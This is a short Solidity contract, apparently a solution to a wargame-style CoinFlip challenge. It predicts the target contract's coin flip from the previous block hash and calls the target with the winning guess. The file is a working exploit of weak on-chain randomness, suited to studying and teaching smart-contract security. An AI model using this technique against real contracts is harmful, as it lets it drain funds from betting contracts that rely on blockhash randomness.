// SPDX-License-Identifier: MIT
import '@openzeppelin/contracts/math/SafeMath.sol';
import './ICoinFlip.sol';

pragma solidity ^0.6.0;


contract CoinFlipExploit {
    using SafeMath for uint256;
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    ICoinFlip coinFlipContract;

    constructor(address coinFlipContractAddress) public{
        coinFlipContract=ICoinFlip(coinFlipContractAddress);
    }

    function flip() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        return coinFlipContract.flip(side);
    }
}